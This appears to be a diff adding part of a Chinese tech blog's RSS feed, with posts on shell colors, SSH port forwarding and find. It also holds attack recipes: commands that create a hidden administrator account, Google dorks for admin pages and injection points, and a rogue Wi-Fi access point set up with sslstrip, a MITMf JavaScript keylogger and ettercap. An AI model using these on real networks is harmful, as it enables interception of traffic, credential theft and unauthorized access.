+&lt;span class=&quot;nv&quot;&gt;BYellow&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'\e[1;33m'&lt;/span&gt;      &lt;span class=&quot;c&quot;&gt;# Yellow&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;BBlue&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'\e[1;34m'&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;# Blue&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;BPurple&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'\e[1;35m'&lt;/span&gt;      &lt;span class=&quot;c&quot;&gt;# Purple&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;BCyan&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'\e[1;36m'&lt;/span&gt;        &lt;span class=&quot;c&quot;&gt;# Cyan&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;BWhite&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'\e[1;37m'&lt;/span&gt;       &lt;span class=&quot;c&quot;&gt;# White&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# 使用&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[40;37m 黑底白字 &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[0m&quot;&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[41;37m 红底白字 &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[0m&quot;&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[42;37m 绿底白字 &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[0m&quot;&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[43;37m 黄底白字 &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[0m&quot;&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[44;37m 蓝底白字 &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[0m&quot;&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[45;37m 紫底白字 &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[0m&quot;&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[46;37m 天蓝底白字 &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[0m&quot;&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[47;30m 白底黑字 &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33[0m&quot;&lt;/span&gt;
+
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; -e &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;BRed&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Hello &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;BYellow&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;World&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;这里值得注意的是，执行&lt;code class=&quot;highlighter-rouge&quot;&gt;sh color.sh&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;./color.sh&lt;/code&gt;的输出效果不一样，通过我们会使用&lt;code class=&quot;highlighter-rouge&quot;&gt;chmod u+x color.sh&lt;/code&gt;进行授权，然后直接运行 &lt;code class=&quot;highlighter-rouge&quot;&gt;./color.sh&lt;/code&gt;的方式进行使用，这样&lt;code class=&quot;highlighter-rouge&quot;&gt;echo -e&lt;/code&gt;才能生效。s&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;截图&quot;&gt;截图&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ohdpyqlwy.bkt.clouddn.com/shell-color.png&quot; alt=&quot;shell-color&quot; /&gt;&lt;/p&gt;
+</description>  
+               <pubDate>Mon, 09 Jan 2017 00:00:00 +0800</pubDate>  
+               <link>http://localhost:4000/2017/01/shell-font-color/</link>  
+               <guid isPermaLink="true">http://localhost:4000/2017/01/shell-font-color/</guid>  
+               </item>  
+          
+            <item>  
+               <title>Windows中关于"net user"命令的hacker语法备注</title>  
+               <description>&lt;h1 id=&quot;windows中关于net-user命令的hacker语法备注&quot;&gt;Windows中关于”net user”命令的hacker语法备注&lt;/h1&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;# 创建用户并增加到管理员组
+net user hacker$ hacker123 /add
+net localgroup administrators hacker$ /add
+
+# 移除目标用户密码
+net user hacker$ *
+
+# 删除目标用户
+net user hacker$ /delete
+&lt;/code&gt;&lt;/pre&gt;
+</description>  
+               <pubDate>Sun, 08 Jan 2017 00:00:00 +0800</pubDate>  
+               <link>http://localhost:4000/2017/01/hacker-net-user/</link>  
+               <guid isPermaLink="true">http://localhost:4000/2017/01/hacker-net-user/</guid>  
+               </item>  
+          
+            <item>  
+               <title>Google Hack 语法收集</title>  
+               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#google-hack-语法收集&quot; id=&quot;markdown-toc-google-hack-语法收集&quot;&gt;Google Hack 语法收集&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#搜索语法&quot; id=&quot;markdown-toc-搜索语法&quot;&gt;搜索语法&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#查找示例&quot; id=&quot;markdown-toc-查找示例&quot;&gt;查找示例&lt;/a&gt;        &lt;ul&gt;
+          &lt;li&gt;&lt;a href=&quot;#查找后台地址&quot; id=&quot;markdown-toc-查找后台地址&quot;&gt;查找后台地址&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#查找上传漏洞&quot; id=&quot;markdown-toc-查找上传漏洞&quot;&gt;查找上传漏洞&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#查找注入点&quot; id=&quot;markdown-toc-查找注入点&quot;&gt;查找注入点&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#查找编辑器页面&quot; id=&quot;markdown-toc-查找编辑器页面&quot;&gt;查找编辑器页面&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#查找重要文件&quot; id=&quot;markdown-toc-查找重要文件&quot;&gt;查找重要文件&lt;/a&gt;&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;google-hack-语法收集&quot;&gt;Google Hack 语法收集&lt;/h1&gt;
+
+&lt;h2 id=&quot;搜索语法&quot;&gt;搜索语法&lt;/h2&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;名称&lt;/th&gt;
+      &lt;th&gt;含义&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;intext&lt;/td&gt;
+      &lt;td&gt;网页中的正文内容中的某个字符做为搜索条件&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;intitle&lt;/td&gt;
+      &lt;td&gt;搜索网页标题中是否有我们所要找的字符&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;cache&lt;/td&gt;
+      &lt;td&gt;关于某些内容的缓存&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;define&lt;/td&gt;
+      &lt;td&gt;搜索某个词语的定义&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;filetype&lt;/td&gt;
+      &lt;td&gt;搜索指定类型的文件&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;inf&lt;/td&gt;
+      &lt;td&gt;查找指定站点的一些基本信息&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;inurl&lt;/td&gt;
+      &lt;td&gt;搜索指定的字符是否存在于URL中&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;site&lt;/td&gt;
+      &lt;td&gt;返回指定站点信息&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;查找示例&quot;&gt;查找示例&lt;/h2&gt;
+
+&lt;h3 id=&quot;查找后台地址&quot;&gt;查找后台地址&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;site:example.com intext:管理|后台|登陆|用户名|密码|验证码|系统|帐号
+site:example.com inurl:login/admin/manage/manager/admin_login/login_admin/system/boss/master
+site:example.com intitle:管理|后台|登陆|
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;查找上传漏洞&quot;&gt;查找上传漏洞&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;site:example.com inurl:file
+site:example.com inurl:load
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;查找注入点&quot;&gt;查找注入点&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;site:example.com inurl:php?id=
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;查找编辑器页面&quot;&gt;查找编辑器页面&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;site:example.com inurl:fck
+site:example.com inurl:ewebeditor
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;查找重要文件&quot;&gt;查找重要文件&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;site:example.com inurl:robots.txt
+site:example.com filetype:mdb
+site:example.com filetype:ini
+site:example.com inurl:txt
+site:example.com filetype:php
+site:example.com filetype:asp
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+</description>  
+               <pubDate>Sun, 08 Jan 2017 00:00:00 +0800</pubDate>  
+               <link>http://localhost:4000/2017/01/google-hack-syntax/</link>  
+               <guid isPermaLink="true">http://localhost:4000/2017/01/google-hack-syntax/</guid>  
+               </item>  
+          
+            <item>  
+               <title>Kali中使用Aircrack-ng和Dnsmasq工具创建伪AP热点</title>  
+               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#kali中使用aircrack-ng和dnsmasq工具创建伪ap热点&quot; id=&quot;markdown-toc-kali中使用aircrack-ng和dnsmasq工具创建伪ap热点&quot;&gt;Kali中使用Aircrack-ng和Dnsmasq工具创建伪AP热点&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#1必须工具&quot; id=&quot;markdown-toc-1必须工具&quot;&gt;1.必须工具&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#2查看无线网卡并启动监听&quot; id=&quot;markdown-toc-2查看无线网卡并启动监听&quot;&gt;2.查看无线网卡并启动监听&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#3创建无线ap热点&quot; id=&quot;markdown-toc-3创建无线ap热点&quot;&gt;3.创建无线AP热点&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#4创建虚拟网卡及网关&quot; id=&quot;markdown-toc-4创建虚拟网卡及网关&quot;&gt;4.创建虚拟网卡及网关&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#5编辑dnsmasq配置并启动&quot; id=&quot;markdown-toc-5编辑dnsmasq配置并启动&quot;&gt;5.编辑Dnsmasq配置并启动&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#6开启ip转发并设置iptables转发规则&quot; id=&quot;markdown-toc-6开启ip转发并设置iptables转发规则&quot;&gt;6.开启IP转发并设置IPTables转发规则&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#后续可以做什么&quot; id=&quot;markdown-toc-后续可以做什么&quot;&gt;后续可以做什么？&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;kali中使用aircrack-ng和dnsmasq工具创建伪ap热点&quot;&gt;Kali中使用Aircrack-ng和Dnsmasq工具创建伪AP热点&lt;/h1&gt;
+
+&lt;h2 id=&quot;1必须工具&quot;&gt;1.必须工具&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Aircrack-ng&lt;/li&gt;
+  &lt;li&gt;Dnsmasq&lt;/li&gt;
+  &lt;li&gt;Wireless Adapter&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Aircrack-ng&lt;/strong&gt;：Aircrack-ng是一个与802.11标准的无线网络分析有关的安全软件，主要功能有：网络侦测，数据包嗅探，WEP和WPA/WPA2-PSK破解。Aircrack-ng可以工作在任何支持监听模式的无线网卡上并嗅探802.11a，802.11b，802.11g的数据。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Dnsmasq&lt;/strong&gt;：DNSmasq是一个小巧且方便地用于配置DNS和DHCP的工具，适用于小型网络，它提供了DNS功能和可选择的DHCP功能。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Wireless Adapter&lt;/strong&gt;：无线网卡，伪装AP热点无线一个无线网卡，建议使用外置的无线网卡。&lt;/p&gt;
+
+&lt;h2 id=&quot;2查看无线网卡并启动监听&quot;&gt;2.查看无线网卡并启动监听&lt;/h2&gt;
+&lt;p&gt;使用&lt;code class=&quot;highlighter-rouge&quot;&gt;airmon-ng&lt;/code&gt;命令查看当前可用的无线网卡信息，如wlan0
+使用&lt;code class=&quot;highlighter-rouge&quot;&gt;airmon-ng start [网卡名称]&lt;/code&gt;启动无线网卡为监听模式，得到wlan0mon&lt;/p&gt;
+
+&lt;h2 id=&quot;3创建无线ap热点&quot;&gt;3.创建无线AP热点&lt;/h2&gt;
+&lt;p&gt;使用命令&lt;code class=&quot;highlighter-rouge&quot;&gt;airbase-ng -e [AP_NAME] -c [channel] wlan0mon&lt;/code&gt;创建无线AP热点，如：&lt;/p&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;airbase-ng -e FreeWifi -c 6 wlan0mon
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;此时可以扫描到创建的无线热点，但是不能连接去。&lt;/p&gt;
+
+&lt;h2 id=&quot;4创建虚拟网卡及网关&quot;&gt;4.创建虚拟网卡及网关&lt;/h2&gt;
+&lt;p&gt;新打开一个终端，执行以下命令创建虚拟网卡及其路由配置&lt;/p&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ifconfig at0 10.0.0.1/24 up
+ifconfig at0 mtu 1400
+route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;5编辑dnsmasq配置并启动&quot;&gt;5.编辑Dnsmasq配置并启动&lt;/h2&gt;
+&lt;p&gt;编辑 &lt;strong&gt;dnsmasq&lt;/strong&gt; 配置文件&lt;code class=&quot;highlighter-rouge&quot;&gt;vi /etc/dnsmasq.conf&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;interface&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;at0
+dhcp-range&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10.0.0.10,10.0.0.250,12h
+dhcp-option&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;3,10.0.0.1
+dhcp-option&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;6,10.0.0.1
+&lt;span class=&quot;nv&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;8.8.8.8
+log-dhcp
+log-queries
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;启动 &lt;strong&gt;dnsmasq&lt;/strong&gt; 服务&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dnsmasq -C /etc/dnsmasq.conf -d
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;6开启ip转发并设置iptables转发规则&quot;&gt;6.开启IP转发并设置IPTables转发规则&lt;/h2&gt;
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;iptables -flush
+&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;1 &amp;gt; /proc/sys/net/ipv4/ip_forward
+
+iptables -P FORWARD ACCEPT
+iptables -append FORWARD -in-interface at0 ACCEPT
+
+iptables -table -nat -append POSTROUTING -out-interface eth0 -j MASQUERADE
+iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;后续可以做什么&quot;&gt;后续可以做什么？&lt;/h2&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;iptables -t nat -A PREROUTING -p tcp -destination 80 -j REDIRECT -to-port 10000
+sslstrip -f -p -k 10000
+
+mitmf -i at0 --spoof --arp -gateway 10.0.0.1 --jskeylogger --hsts
+
+ettercap -p -u -T -q -i at0
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+</description>  
+               <pubDate>Sun, 08 Jan 2017 00:00:00 +0800</pubDate>  
+               <link>http://localhost:4000/2017/01/aircrack-dnsmasq-fake-ap/</link>  
+               <guid isPermaLink="true">http://localhost:4000/2017/01/aircrack-dnsmasq-fake-ap/</guid>  
+               </item>  
+          
+            <item>  
+               <title>SSH隧道技术-本地端口转发</title>  
+               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#ssh隧道技术-本地端口转发&quot; id=&quot;markdown-toc-ssh隧道技术-本地端口转发&quot;&gt;SSH隧道技术-本地端口转发&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#ssh隧道&quot; id=&quot;markdown-toc-ssh隧道&quot;&gt;SSH隧道&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#本地端口转发&quot; id=&quot;markdown-toc-本地端口转发&quot;&gt;本地端口转发&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#隧道参数&quot; id=&quot;markdown-toc-隧道参数&quot;&gt;隧道参数&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#总结&quot; id=&quot;markdown-toc-总结&quot;&gt;总结&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;ssh隧道技术-本地端口转发&quot;&gt;SSH隧道技术-本地端口转发&lt;/h1&gt;
+
+&lt;h2 id=&quot;ssh隧道&quot;&gt;SSH隧道&lt;/h2&gt;
+
+&lt;p&gt;隧道是一种把一种网络协议封装进另外一种网络协议进行传输的技术。这里我们研究ssh隧道，所以所有的网络通讯都是加密的。又被称作端口转发，因为ssh隧道通常会绑定一个本地端口，所有发向这个端口端口的数据包，都会被加密并透明地传输到远端系统。&lt;/p&gt;
+
+&lt;h2 id=&quot;本地端口转发&quot;&gt;本地端口转发&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;本地端口转发&lt;/strong&gt;是将某个内网中的服务端口映射到本地中，访问映射的本地端口即可实现访问某个内网中的服务。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ohdpyqlwy.bkt.clouddn.com/local-ssh-tunnel.png&quot; alt=&quot;ssh-tunnel-local&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;如上图，本地的&lt;strong&gt;192.168.1.150&lt;/strong&gt;的机器希望访问另一个内网的&lt;strong&gt;10.132.37.150&lt;/strong&gt;机器上的oracle数据库，前提是这里有&lt;strong&gt;121.199.9.15&lt;/strong&gt;的ssh访问权。在本机&lt;code class=&quot;highlighter-rouge&quot;&gt;Localhost&lt;/code&gt;上建立本地隧道的语句如下：&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 语法规则&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# ssh &amp;lt;参数&amp;gt; &amp;lt;本地映射端口&amp;gt;:&amp;lt;内网服务器&amp;gt;:&amp;lt;内网服务端口&amp;gt; &amp;lt;SSH服务&amp;gt; &amp;lt;SSH服务端口&amp;gt;&lt;/span&gt;
+ssh -N -f -L 1521:10.132.37.150:1521 root@121.199.9.15 -p 43221
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;执行完上述命令后，ssh本地隧道进程会后台执行，且已经开放了1521端口，使用数据库工具连接本地1521端口即可访问数据库服务。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;检查本地是否正确映射&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 查看本地1521端口是否正确打开&lt;/span&gt;
+wangjun[192] /Users/wangjun &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;netstat -an | grep 1521
+tcp4       0      0  127.0.0.1.1521         &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN
+tcp6       0      0  ::1.1521               &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                    LISTEN
+&lt;span class=&quot;c&quot;&gt;# 查看ssh隧道进程是否已经执行&lt;/span&gt;
+wangjun[192] /Users/wangjun &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ps -ef | grep ssh
+  501  2000     1   0  2:44PM ??         0:00.02 /usr/bin/ssh-agent -l
+  501  4994     1   0 10:47AM ??         0:00.00 ssh -N -f -L 1521:10.132.37.150:1521 bosyun@121.199.9.17 -p 4322
+  501  4999  3105   0 10:47AM ttys001    0:00.00 grep ssh
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;隧道参数&quot;&gt;隧道参数&lt;/h2&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;名称&lt;/th&gt;
+      &lt;th&gt;含义&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;q&lt;/td&gt;
+      &lt;td&gt;该命令进入安全模式&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;T&lt;/td&gt;
+      &lt;td&gt;该命令不占用shell&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;N&lt;/td&gt;
+      &lt;td&gt;该命令不执行远程命令&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;f&lt;/td&gt;
+      &lt;td&gt;命令在后台执行&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;D&lt;/td&gt;
+      &lt;td&gt;socket5服务器地址和端口&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;L&lt;/td&gt;
+      &lt;td&gt;本地映射端口&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;总结&quot;&gt;总结&lt;/h2&gt;
+
+&lt;p&gt;除了上面提到的远程端口转发，SSH隧道技术还有远程端口转发及动态端口转发，根据实际情况网上参考即可。&lt;/p&gt;
+</description>  
+               <pubDate>Wed, 04 Jan 2017 00:00:00 +0800</pubDate>  
+               <link>http://localhost:4000/2017/01/ssh-tunnel-local/</link>  
+               <guid isPermaLink="true">http://localhost:4000/2017/01/ssh-tunnel-local/</guid>  
+               </item>  
+          
+            <item>  
+               <title>Linux中关于find命令全收集参考</title>  
+               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#linux中关于find命令全收集参考&quot; id=&quot;markdown-toc-linux中关于find命令全收集参考&quot;&gt;Linux中关于find命令全收集参考&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#忽略大小写查找文件&quot; id=&quot;markdown-toc-忽略大小写查找文件&quot;&gt;忽略大小写查找文件&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#找到文件并执行命令&quot; id=&quot;markdown-toc-找到文件并执行命令&quot;&gt;找到文件并执行命令&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#相反匹配&quot; id=&quot;markdown-toc-相反匹配&quot;&gt;相反匹配&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#查找空文件0字节&quot; id=&quot;markdown-toc-查找空文件0字节&quot;&gt;查找空文件（0字节）&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#查找5个最大文件&quot; id=&quot;markdown-toc-查找5个最大文件&quot;&gt;查找5个最大文件&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#查找5个最小的文件&quot; id=&quot;markdown-toc-查找5个最小的文件&quot;&gt;查找5个最小的文件&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#查找所有的目录&quot; id=&quot;markdown-toc-查找所有的目录&quot;&gt;查找所有的目录&lt;/a&gt;&lt;/li&gt;
